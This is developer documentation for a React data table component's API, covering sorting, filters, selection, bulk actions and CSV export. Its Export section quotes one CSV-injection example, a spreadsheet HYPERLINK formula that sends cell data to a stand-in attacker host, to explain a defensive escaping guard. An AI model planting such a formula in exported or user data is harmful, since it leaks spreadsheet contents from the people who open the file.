# Data table

The kit's data table: server-driven sorting and pagination, search, density, and every data state, on top of TanStack Table v9. This page is the API contract and the reasoning behind it.

## API rules

1. **Features are opt-in child components, not boolean props.** `<DataTable>` takes at most three props: `table`, `aria-label` and `children`. Search, density, the grid and pagination are parts you compose (`<DataTable.Search />`); a feature you don't render doesn't exist. A type-level test fails if a fourth prop is added.
2. **Column behavior lives in typed column `meta`.** Label, alignment, width and sort mapping are declared once per column (filters and CSV join them in later stages). Headers, the toolbar, filters and export all read `meta`; nothing is configured twice.
3. **The table does not fetch.** It receives a `source` (`useOrdersTableData('orders')`: URL params plus a `DataState`) and renders it.
4. **Escape hatch: `table.instance`** is the TanStack Table instance, for anything the parts don't cover.

- **Code:** [`src/components/data-table/`](../src/components/data-table/)
- **Orders columns:** [`src/features/orders/orderColumns.tsx`](../src/features/orders/orderColumns.tsx)
- **Stories:** Storybook → **Data/DataTable** (live MSW API, with the URL bar and request log in a dev drawer)
- **Related:** [url-state.md](url-state.md) (where the params come from), [data-states.md](data-states.md) (what `DataState` means), [keyboard-grid.md](keyboard-grid.md) (the ARIA grid and its keyboard model)

## Usage

```tsx
import { DataTable, useDataTable } from '@/components'
import { useOrdersTableData } from '@/lib/query'
import { getOrderRowId, orderColumns } from './orderColumns'

export function OrdersTable() {
  const source = useOrdersTableData('orders') // URL params → query → DataState
  const table = useDataTable({
    id: 'orders',
    columns: orderColumns, // module scope: stable identity
    source,
    getRowId: getOrderRowId,
    selectable: true, // the selection column + table.selection
    onOpenRow: openDetails, // Enter on a text cell (keyboard-grid.md)
  })

  return (
    <DataTable table={table} aria-label="Orders">
      <DataTable.Toolbar>
        <DataTable.Search />
        <DataTable.ColumnToggle slot="end" />
        <DataTable.Export slot="end" />
        <DataTable.DensityToggle slot="end" />
        <DataTable.KeyboardHelp slot="end" />
      </DataTable.Toolbar>
      <DataTable.Grid className="max-h-[48rem]" />
      <DataTable.Pagination />
      <DataTable.BulkBar>
        {(selection) => <BulkStatusAction selection={selection} />}
      </DataTable.BulkBar>
    </DataTable>
  )
}
```

Columns are defined once, outside any component:

```tsx
const helper = createColumnHelper<Order>()

export const orderColumns = helper.columns([
  dataColumn(helper, 'amount', {
    meta: { label: 'Amount', align: 'end', sortField: 'amount', width: { min: 120, ideal: 136 } },
    cell: (info) => <AmountCell value={info.getValue()} />,
  }),
  dataColumn(helper, (order) => order.customer.name, {
    id: 'customer',
    meta: { label: 'Customer', sortField: 'customer', width: { min: 240, grow: true } },
    cell: (info) => <CustomerCell {...info.row.original.customer} />,
  }),
  // …
])
```

`dataColumn` is `helper.accessor` with `meta` required, so a column without a label doesn't compile (there's a `@ts-expect-error` test). The header text defaults to `meta.label`.

### The parts

| Part                      | What it does                                                                                                                                                                                                                                                                                      |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<DataTable>`             | Provides the table to its parts and renders the card. The card has no horizontal padding, so the grid bleeds to its edges; each part pads itself.                                                                                                                                                 |
| `DataTable.Toolbar`       | A wrapping row with a start and an end area. Children go to the end with `slot="end"`, or inside `DataTable.Toolbar.End`.                                                                                                                                                                         |
| `DataTable.Search`        | A `SearchInput` for `params.q`: a local draft, committed 300ms after the last keystroke (or on Enter) with history `replace`. See [Search: the draft and the URL](#search-the-draft-and-the-url).                                                                                                 |
| `DataTable.DensityToggle` | Comfortable / compact, as a labelled radiogroup of native radios. Density is a device preference (`setDensity`: localStorage and `<html data-density>`), not list state, so it's not in the URL.                                                                                                  |
| `DataTable.Grid`          | The table, inside a `DataBoundary`: skeleton, empty, no-results, error, and the refetch bar, stale banner and placeholder dimming over the rows. `className` goes on the scroll container. Once there are rows it's an ARIA grid with keyboard navigation ([keyboard-grid.md](keyboard-grid.md)). |
| `DataTable.Pagination`    | "Showing 51–100 of 4,213", rows per page (25 / 50 / 100 / 500), "Page 2 of 85", previous / next. Each change is a URL push. Hidden when there is nothing to page through.                                                                                                                         |
| `DataTable.ColumnToggle`  | "Columns": a menu with a checkbox per data column (labels from `meta.label`) that stays open while toggling, then "Reset to default". See [Column visibility](#column-visibility).                                                                                                                |
| `DataTable.Export`        | CSV of the visible columns: the current page, or (with a selection) a menu with "Export selected (n)". See [Export](#export).                                                                                                                                                                     |
| `DataTable.BulkBar`       | A render prop, `{(selection) => actions}`, shown only while rows are selected: "{n} selected", the actions, and Clear. See [The bulk bar](#the-bulk-bar).                                                                                                                                         |
| `DataTable.Filters`       | One filter pill per column with `meta.filter`, then "Clear all", plus a notice when the link carried invalid filters. See [Filters](#filters).                                                                                                                                                    |
| `DataTable.SavedViews`    | "Views": built-in presets and the user's own views, stored URL queries. See [Saved views](#saved-views).                                                                                                                                                                                         |
| `DataTable.KeyboardHelp`  | An icon button ("Keyboard shortcuts") and a dialog listing every grid shortcut, generated from `keymap.ts`; **?** in the grid opens it too. See [keyboard-grid.md](keyboard-grid.md#keyboard-help).                                                                                               |

## Column meta reference

`DataColumnMeta` augments TanStack's `ColumnMeta` (declaration merging in [`columns.ts`](../src/components/data-table/columns.ts)), so `column.columnDef.meta` is typed everywhere, including inside TanStack's own types.

| Field       | Type                                              | Default        | Read by                                                                                                                                                                                                                                           |
| ----------- | ------------------------------------------------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `label`     | `string` (**required**)                           |                | Header text, sort button name, announcements, the column toggle; CSV headers (4c)                                                                                                                                                                 |
| `align`     | `'start' \| 'end'`                                | `'start'`      | Header and cells (numbers are end-aligned so digits line up), skeleton bars                                                                                                                                                                       |
| `width`     | `{ min: number; ideal?: number; grow?: boolean }` | `{ min: 120 }` | The grid track: `minmax(min, ideal)`, or `minmax(min, 1fr)` when `grow` or no `ideal`. The sum of `min`s is where horizontal scrolling starts.                                                                                                    |
| `sortField` | `SortField`                                       | none           | Maps the column to the API sort field. Absent means not sortable: the header is plain text.                                                                                                                                                       |
| `hideable`  | `boolean`                                         | `true`         | `false`: always shown, checked and disabled in the column menu                                                                                                                                                                                    |
| `filter`    | `{ field, type: 'enum', options } \| { field: 'amount', type: 'number' } \| { field: 'createdAt', type: 'date' }` | none | `DataTable.Filters`: makes the column filterable and names the API `FilterField` it writes. Enum options are `{ value, label }`. See [Filters](#filters). |
| `csv`       | `false \| (row) => value`                         | accessor value | `false` leaves the column out of CSV (the selection column sets it); a function gives the exported value. See [Export](#export).                                                                                                                  |
| `cellKind`  | `'text' \| 'widget' \| 'composite'`               | `'text'`       | What takes keyboard focus: the cell (text; Enter opens the row), its one control (widget: the checkbox, the ⋯ button), or the cell and then, with Enter, its controls (composite: Customer). See [keyboard-grid.md](keyboard-grid.md#cell-kinds). |
| `utility`   | `boolean`                                         | `false`        | A utility column (selection, row actions): the header label is for screen readers only, and it isn't listed in the column menu. Set `hideable: false` and `csv: false` with it.                                                                   |

`sortField` is typed as the contract's `SortField`, so a column can't claim to sort by a field the API doesn't support.

## Sorting and paging are derived from the URL

[`useDataTable`](../src/components/data-table/useDataTable.ts) builds a TanStack Table with `manualSorting` and `manualPagination` and only the core row model: the server sorts and pages, and TanStack only lays out what it's given. Its `sorting` and `pagination` state are **derived from `params` on every render**. There's no table-local copy to keep in sync:

```
params.sort "-amount"  ──sortingFromParams──►  [{ id: <column with meta.sortField 'amount'>, desc: true }]
params.page, pageSize  ──────────────────────►  { pageIndex: page - 1, pageSize }

header click → column.toggleSorting()
            → onSortingChange(updater)
            → sortUpdaterFor: which column was toggled? its meta.sortField?
            → setParams(setSort('amount'))      the 3a action: none → desc → asc → default
            → URL changes → params → sorting (back to the top)
```

TanStack proposes a next sort state from its own cycle; the table only takes **which column** was toggled from it and lets `setSort` apply the kit's cycle. So the cycle is defined once, in the URL layer, and Back, a shared link and a header click all agree. A sort field no column maps to derives to `[]`, so no header claims a sort it doesn't show.

- **Accessible sort headers.** The `<th>` carries `aria-sort` (`ascending` / `descending`) on the sorted column only. Sortable headers hold a button whose name says what a click will do ("Amount, sort descending", "Amount, clear sort"), computed from the same `setSort` cycle. The default sort (`-createdAt`) shows as Created, descending.
- **`pageCount`** is `ceil(total / pageSize)`. While a new key loads, `total` keeps the last known value, so the page count and the pagination bar don't flicker. `rows` is the ready page's rows, or `[]`.
- **Stable inputs.** `columns` come from module scope and `data` falls back to a module-level empty array, so TanStack never sees new references it would have to rebuild for. `useTable` builds the core table once and updates its options on each render.

## Why the table doesn't fetch

A table that fetches has to own the request's inputs (the params), the request, and its states. That makes it the second owner of state the URL already owns (see [url-state.md](url-state.md)) and the second implementation of loading, error and empty states that `DataBoundary` already has. Receiving a `source` instead keeps the table a renderer:

- **One source of truth.** Params come from the URL through `useListParams`; the table writes back through `setParams`. Nothing in the table can drift.
- **No double fetch.** The query key, cancellation, prefetch of the next page and `keepPreviousData` all live in the query layer, and are proven there (`noDoubleFetch.test.tsx`). The table can't accidentally add a request.
- **Any data source.** `DataTableSource<T>` is `{ params, setParams, resetParams, dataState }`. A table over a different endpoint, a client-side array, or a test fixture provides the same shape; the unit tests hand in a fixed `DataState` and never touch the network.

## The escape hatch

`table.instance` is the TanStack Table v9 instance (`ReactTable<DataTableFeatures, TData>`), for things the parts don't cover yet: reading `getHeaderGroups()`, building a custom part, or calling `instance.setPageIndex(…)`. Its sort and pagination setters go through the same `onSortingChange` / `onPaginationChange` handlers, so they write the URL like everything else.

Registered features: `rowSortingFeature`, `rowPaginationFeature` and `columnVisibilityFeature` (v9 makes features explicit; unused ones aren't bundled). Selection is the kit's own model, not `rowSelectionFeature`: it keeps a snapshot of every selected row across pages, which TanStack's id map doesn't. `instance.setColumnVisibility(…)` goes through the same rules as the menu.

## Native table elements, laid out with CSS grid

The grid is `<table>`, `<thead>`, `<tbody>`, `<tr>`, `<th>` and `<td>`, with `display: grid` on the table, the row groups and every row, and one shared `grid-template-columns` (a CSS variable built from the columns' `meta.width`).

- **Real table semantics.** Screen readers announce rows and columns, header association works, and `aria-sort` sits on a real column header. A `div` grid would have to recreate all of that with ARIA. The roles are also stated explicitly, because some browsers drop a table's implicit semantics when its `display` changes. Since 5a the live table is `role="grid"` (`row`, `columnheader`, `gridcell`, with page-global `aria-rowindex`); the loading skeleton is a plain table hidden from assistive tech. See [keyboard-grid.md](keyboard-grid.md#grid-semantics).
- **Rows are independent grid lines.** Each `<tr>` lays itself out from the shared template, so Stage 5 can virtualize (render a window of rows, absolutely positioned) without changing the markup or the column logic. A classic `display: table` layout sizes columns from all rows' content, which virtualization breaks.
- **Content-independent widths.** `minmax(min px, ideal px | 1fr)` doesn't depend on cell content, so columns don't jump as pages change.
- **Scrolling.** The scroll container wraps the table and scrolls both ways; the header is `position: sticky` at its top. Below the sum of the column minimums the table scrolls horizontally inside the card. The caller caps the height with `className`.

The skeleton is the same table: the real header (labels and sort indicators, but not yet buttons) and 8 rows whose bars follow each column's alignment. Nothing shifts when the data arrives.

## Filters

`<DataTable.Filters />` has no props. It renders one pill per column whose meta has a `filter`, in column order, so adding a filter to a table is one line of column meta. `filter.field` is typed as the contract's filter fields, so a column can't claim a filter the API doesn't accept.

- **Inactive:** an outline pill, "Status ⌄". **Active:** an accent-subtle pill with a summary ("Status: Paid, Shipped", "Status: 3 selected", "Amount > $500", "Amount $100–$900", "Created: Last 7 days", "Created: Jan 1 – Mar 31") and a separate × ("Remove Status filter").
- **Editors** open in a popover named by a heading with the column label. Focus starts on the first control and returns to the pill on close. Enum: a checkbox per option, applied on every toggle (unchecking the last one removes the filter), with Select all / Clear. Number: an operator (is above / is below / is between), one or two amounts, Apply or Enter, with inline validation (required, non-negative, min ≤ max). Date: presets (Today, Last 7 days, Last 30 days, This month, Last month) that apply at once, or a custom range of two native date inputs.
- **Dates are local calendar days.** Presets are computed from the user's local today and are inclusive at both ends. A range that equals a preset today is summarized by the preset's name.
- **The URL is the only copy.** Every change is `setParams` with the existing updaters (`upsertFilter`, `removeFilter`, `clearFilters`), with history `push`. The page reset comes from `applyParamsUpdate`, as for any other change. "Clear all" removes the filters only; the sort and the search stay. Because the pills read `params.filters`, any link that sets a filter (the Overview's status donut: `?view=orders&orders.f=status:in:paid`) shows its pill as active, with no extra wiring.
- **Invalid links.** When the lenient decoder dropped parts of the link (`useListParams().dropped`, passed through the table source), a dismissible notice says "1 invalid filter in the link was ignored". Dismissing it lasts for the page session.

## Saved views

`<DataTable.SavedViews presets={…} />` is the "Views" menu: built-in presets (Orders: [`orderViews.ts`](../src/features/orders/orderViews.ts)) and the user's own views.

**A view is a stored URL query.** It's the canonical encoding of filters, sort, q and page size, never the page (`listParamsKey` with the page held at 1). Applying a view is one `setParams` push that replaces those four and goes back to page 1. Knowing which view you're on is a string compare between the current params' key and each view's key. There is deliberately no new state system: the URL already is the list's state, its canonical encoding already makes equal params equal strings, and a second store of "the current view" could only drift from it. A view link is the same query written into the table's namespace.

- **Presets** come from code, aren't deletable, and may be functions of today: "Needs attention" (pending, created in the last 7 days) is recomputed whenever the menu renders.
- **User views** live in localStorage under `dtk:views:${tableId}` as `{ id, name, query, createdAt }[]`. Unreadable storage falls back to `[]`. Names are required, at most 40 characters and unique among the user's views (case-insensitive). Each has a ⋯ submenu: Rename, Copy link, Delete (confirmed, danger tone).
- **The trigger** says "Views" when nothing matches, the view's name when the params match one exactly, and "{name} (edited)" once the params drift from the view the user last applied. That last-applied id is session state (sessionStorage), because "edited" only means something relative to a choice made in this session. When the edited view is a user view, "Save changes to {name}" overwrites its query.
- "Copy link to this view" copies the current URL. Every view is already a link, since the URL holds the state.

## Search: the draft and the URL

The draft is UI state; the URL is app state. What's in the box is the text being typed. The list only sees it once it's committed: 300ms after the last keystroke, or immediately on Enter, with history `replace` so typing never creates Back steps.

Going the other way is subtler. When `q` changes from **outside** (Back, Clear filters, a shared link) the box must follow the URL. But the box's own commit changes `q` too, and the URL stores the trimmed text, so naively copying `q` into the draft would eat a trailing space mid-typing ("acme " → "acme"), or fight the keyboard. So the box remembers the URL value it last agreed with, and when `q` differs from that it adopts `q` **only if `q` also differs from what the draft already says** (trimmed). Its own commit always matches the draft, so it never resets it; a real outside change always does. This is derived state, updated during render; no effect copies the URL into state. A URL change also cancels a pending commit, so a debounce scheduled before Back can't overwrite what Back restored.

## Announcements

Polite, through the shared announcer, and only after the data **settles** (ready, and not the previous key's placeholder rows), so a screen reader never hears about rows that aren't on screen yet:

| Change                           | Message                                                                           |
| -------------------------------- | --------------------------------------------------------------------------------- |
| The sort changed                 | "Sorted by Amount, descending"                                                    |
| Back to the default sort         | "Sort cleared, back to Created, descending"                                       |
| The visible range changed        | "Showing 51–100 of 4,213"                                                         |
| Both (a sort on page 3 → page 1) | One message: "Sorted by Amount, descending. Showing 1–50 of 4,213"                |
| The selection count changed      | "12 selected" / "Selection cleared", 400ms after the last click                   |
| A view change cleared it         | Folded into the settle message: "Sorted by Amount, descending. Selection cleared" |
| A column was toggled             | "Channel column hidden" / "Channel column shown"                                  |

The selection-cleared message rides along with the sort message instead of being sent separately because the announcer keeps only the last of two messages that arrive close together, so one of the two would be lost.

The initial load is never announced: nothing changed from the user's point of view, and `DataBoundary` already covers loading and errors (see [data-states.md](data-states.md#announcements-and-why-errorstate-doesnt-use-rolealert)).

## Column visibility

`DataTable.ColumnToggle` hides and shows columns; `useDataTable` calls `useColumnVisibility(tableId, columns)` internally and feeds it to TanStack's `state.columnVisibility`, so no prop was added to `<DataTable>`. The grid tracks are rebuilt from the visible columns only, so hiding one gives its space to the rest.

**A preference, not view state.** Visibility is stored per user in localStorage (`dtk:columns:${tableId}`), not in the URL. The URL says _what data_ you're looking at, and it's meant to be shared; how one person likes their columns isn't part of that. A link you send shouldn't hide the recipient's columns, and Back shouldn't undo a column change.

- Columns with `meta.hideable === false` are always visible (shown checked and disabled).
- At least one hideable column always stays visible: the last one's checkbox is disabled.
- Reading is defensive: bad JSON, the wrong shape, unavailable storage or a stored state that would hide everything fall back to the defaults; ids that no longer exist are ignored. Writes are wrapped in try/catch.
- The menu stays open while toggling (`onSelect` → `preventDefault`), since changing several columns is the common case. Each toggle is announced.

## Selection

`useDataTable({ selectable: true })` adds the selection column (first, not hideable, not sortable, `meta.csv: false`) and turns on `table.selection`. That option is the one switch: `<DataTable.BulkBar>` doesn't add the column by itself, because a hidden side effect of rendering a child would be harder to reason about than an explicit flag.

```ts
table.selection: {
  ids: string[]; rows: TData[]; count: number
  isSelected(id); toggle(id, { range? }); selectPage(); clearPage(); clear(); remove(ids)
}
```

The model ([`selection.ts`](../src/components/data-table/selection.ts)) is a `Map<rowId, row>`: each selected row's snapshot is kept, so later stages can act on rows from other pages (CSV export of the selection in 4c) without refetching them. `rows` returns the current page's fresh row when it has one, and the snapshot otherwise.

**It's local React state, not URL state.** A selection is a transient working set ("these 12 rows, right now"), not a view anyone shares, bookmarks or returns to with Back.

### Scope: persist across pages, clear on a new view

| Change                                     | Selection |
| ------------------------------------------ | --------- |
| Next / previous page, page size            | kept      |
| A refetch (window focus, after a mutation) | kept      |
| Sort, filters or search (`q`)              | cleared   |

Paging through a result set to pick rows is the point of a cross-page selection. But a selection made under one filter, kept under another, is a trap: "12 selected" would include rows the user can no longer see, and a bulk action would hit them. So the selection belongs to a **view**: `viewKeyOf(params)` is the canonical params key with page and page size left out.

The clear is **derived during render**, not synced in an effect. The selection state remembers the view key it was made under; when the current key differs, `useSelection` resets it in the same render (React's "storing information from previous renders" pattern). No render ever shows the old selection against the new view, and it can't loop: after the reset the keys are equal. It doesn't matter what changed the view (a header click, Clear filters, Back, a pasted link), because it keys off the result, not the cause.

While a placeholder page is shown (the previous key's rows, dimmed), the row checkboxes are unavailable: those rows may belong to the previous view. They're `aria-disabled` rather than `disabled`, so they stay focusable: in the grid's roving tabindex the active cell's checkbox can be the grid's only Tab stop ([keyboard-grid.md](keyboard-grid.md#disabled-controls-stay-focusable)).

### Range select

Shift+click on a row checkbox applies the clicked row's new state to every row between it and the last clicked row, on the current page: shift-clicking an unselected row selects the range, shift-clicking a selected one deselects it. It works in both directions. The anchor is per page, so after a page change a shift+click is a plain toggle (which sets a new anchor). Shift+Space on a focused checkbox does the same for keyboard users, and so does Shift+Space anywhere in a row once the grid has focus (Space toggles a row, Ctrl/Cmd+A the page: see [keyboard-grid.md](keyboard-grid.md#keyboard-map)).

### The 500 cap

The bulk endpoint accepts at most 500 ids (`BULK_STATUS_MAX_IDS`, in the contract). The selection itself isn't capped; above 500 the bulk action is disabled (focusable, `aria-disabled`) with the reason in a tooltip and as its description: "Bulk actions support up to 500 orders".

**"Select all matching" was cut.** Selecting every row of a 4,213-row result means sending 4,213 ids, or a server endpoint that applies a change to "everything matching this filter" (with its own consistency questions: rows that start or stop matching mid-operation). The mock API has neither, so the kit offers page-by-page selection only.

### Styling

Selected rows get `data-selected`: the accent tint (`bg-accent-subtle`, contrast-tested with `fg` and `fg-muted` in both themes) and a 3px accent bar on the left edge (an inset shadow, so it takes no layout space). Rows also carry `aria-selected="true|false"` (and the grid `aria-multiselectable`), so a screen reader announces the state from any cell in the row, not only from the checkbox.

## The bulk bar

`<DataTable.BulkBar>{(selection) => actions}</DataTable.BulkBar>` renders only while something is selected: "{n} selected", the actions, and Clear.

- **Pinned to the bottom of the card** (sticky), so it stays in view while the card scrolls. It uses the inverse surface: a dark pill in light mode, a light one in dark mode. That's done by giving the bar the opposite `data-theme`, so the controls inside (buttons, menus' triggers) are just the normal components and look native on it.
- **It doesn't cover the last rows:** while it's visible the grid's scroll container gets extra bottom padding.
- **It never takes focus when it appears.** Escape while focus is inside it clears the selection (menus and dialogs opened from it handle their own Escape first). When the bar disappears with focus inside it (Clear, Escape), focus moves to the table's region instead of falling to `<body>`.

## Bulk status changes (Orders)

[`BulkStatusAction`](../src/features/orders/BulkStatusAction.tsx) is the Orders bar's action: "Mark as…" → Paid / Shipped / Refunded / Failed → a ConfirmDialog ("Mark 8 orders as shipped?", danger tone for refunded and failed) → `useBulkUpdateStatus`.

**The server is the authority on transitions.** The client doesn't pre-filter which orders "can" become shipped. The rules live in one place (the server), and the response says what happened to every id: `{ updated, failed: [{ id, reason }] }`. A client copy of the rules would drift, and would turn a server rule change into a client bug.

**Partial success is a normal outcome**, summarized by [`summarizeBulkResult`](../src/features/orders/summarizeBulkResult.ts):

| Result       | Toast                                                        |
| ------------ | ------------------------------------------------------------ |
| All updated  | success: "8 orders marked as shipped"                        |
| Some failed  | default: "5 updated, 3 couldn't be changed" + "View details" |
| None updated | danger: "No orders could be changed" + "View details"        |

"View details" opens a dialog listing each failed id with the server's reason, verbatim. It's hosted above the table (`BulkDetailsProvider`), so it still opens after the bar has gone.

**Failed rows stay selected.** After a result, only the updated ids leave the selection. What's left is exactly what didn't change, ready to inspect, act on differently, or clear. The deselection happens once the dialog has closed, so the change is visible, and focus returns to "Mark as…" (or to the table, if nothing is left selected).

**A failed request** (5xx, network) keeps the dialog open with the error inline, and the selection untouched. Mutations then invalidate every order list and the metrics (see [url-state.md](url-state.md#no-optimistic-updates)): no optimistic updates.

## Export

`<DataTable.Export />` writes a CSV of what the user is looking at.

- **Scope: the selection or the page.** With nothing selected, "Export" downloads the current page. With a selection, it opens a menu: "Export selected (n)" or "Export this page (50 rows)". The selection export works across pages because the selection keeps a snapshot of every row ([Selection](#selection)). Row order: selected rows on the current page first, in its (sorted) order; rows from other pages after them, in the order they were selected. Their relative order across pages isn't known without refetching them, so the export doesn't pretend to sort them.
- **Visible columns only, in display order.** A hidden column isn't exported, and the selection column never is (`meta.csv: false`). One CSV column per table column, so the file matches the screen: the Orders customer column exports `Name <email>` in one field rather than splitting into two.
- **Raw values, for spreadsheets.** A column's `meta.csv` function gives its value; without one, it's the raw accessor value, never the formatted cell. Orders: amount `39.98` (2 decimals, no currency symbol, so SUM works), created `2026-10-01T17:51:00.948Z` (ISO, the same in every locale), status and channel their raw values (`paid`, `pos`).
- **Excel-friendly bytes.** The file starts with a UTF-8 BOM (without it, Excel reads "José" as "JosÃ©"), lines end in CRLF (RFC 4180), and the file ends with a CRLF after the last row. Fields with a comma, quote, CR or LF are quoted, with quotes doubled. Numbers are written with `String()`, never locale-formatted.
- **The formula-injection guard.** Spreadsheets run a cell that starts with `=`, `+`, `-` or `@` as a formula (and some act on a leading tab or CR). A customer name like `=HYPERLINK("https://evil.example?d="&A1,"Click")` would run in the exporting user's spreadsheet, with access to the rest of the sheet (OWASP "CSV Injection"). [`toCsv`](../src/lib/csv/toCsv.ts) prefixes any such string with `'`, which spreadsheets read as text. Plain numbers are exempt (`-12.50` must stay a number), but only plain ones: `+1` is guarded. Excel hides the apostrophe; Numbers and Google Sheets show it.
- Disabled (focusable, with the reason in a tooltip) while there's nothing to export: no data yet, or an empty result. A placeholder page (the previous key's rows) isn't exportable either. After a download: a success toast and a polite announcement, "Exported 50 orders".
- **Filenames:** `orders-page-3-2026-10-02.csv`, `orders-selected-12-2026-10-02.csv` (local date).

The pieces: [`toCsv`](../src/lib/csv/toCsv.ts) is pure (no DOM, no BOM) and fully unit-tested; [`downloadCsv`](../src/lib/csv/downloadCsv.ts) adds the BOM, makes the Blob and the temporary link, and revokes the object URL on the next tick; [`buildCsvColumns`](../src/components/data-table/exportColumns.ts) derives the columns from the TanStack instance.

**"Export all matching" was cut.** Exporting all 4,213 rows of a filtered view needs either a server export job (the server streams the file, or emails a link, and the UI shows progress) or client-side paged fetching (fetch every page in sequence, with a progress bar, a Cancel that aborts the in-flight request, and a cap so nobody downloads a million rows into a browser tab). Both are real features of their own, and the mock API has no export endpoint.

## Testing

- **Unit** ([`__tests__/`](../src/components/data-table/__tests__/)): sorting derivation and the `onSortingChange` → `setSort` mapping, pagination math (partial last page, total 0), header `aria-sort` and button names, the escape hatch writing the URL, the search draft (debounce with fake timers, Enter, outside changes, no reset loop), announcements, and the type-level checks (`dataColumn` requires a label; the root has exactly three props).
- **Selection and visibility (unit):** the pure model (toggle, ranges in both directions, deselecting ranges, the per-page anchor, selectPage / clearPage, remove, the header state), the scope rules through the real hook and URL (kept across pages and sizes, cleared on sort / q / filters and on Back to another view, kept across refetches), `useColumnVisibility` (persistence, bad JSON, unknown ids, non-hideable, the last-visible guard), and `summarizeBulkResult` (all / partial / none, plurals).
- **Export (unit):** `toCsv` quoting (comma, quote, CR, LF, a mix), the formula guard (and its numeric exemption), Unicode, null / undefined, CRLF and the final line ending; `buildCsvColumns` (visibility, order, `csv: false`, `csv` over the accessor); the selected-row order; `exportFilename`; and `downloadCsv` (the BOM bytes, the link, the object URL revoked on the next tick).
- **Keyboard (5a):** see [keyboard-grid.md](keyboard-grid.md#testing): the table-driven `gridNav` / `toNavKey` tests, active-cell persistence, the roving tabindex invariant, the ≤ 2 rows per move render count, and a keyboard-only story.
- **Stories** (real Chromium, MSW, axe in both themes and densities): the sort cycle with `aria-sort` and the announcement, Next page served from the prefetch cache (no new request in the log), search with at most one history entry, Back restoring sort and search, Clear filters, page size 100, and the narrow container's horizontal scroll with a sticky header. For 4b: the header checkbox (mixed state), shift+click, selection across pages and cleared by a sort, Escape in the bar, a partial bulk success (toast, details, failed rows still selected), a failed bulk request (inline error, dialog open), and columns hidden, persisted across a remount, reset, and the last one locked. The axe check also runs with the column menu open, the dialogs open and the bar visible. For 4c: the exported Blob (captured from `URL.createObjectURL`) has the BOM, the visible columns as its header, 50 rows and CRLF only; hiding Channel removes it; a 5-row selection across two pages exports exactly those ids; and the toast appears.
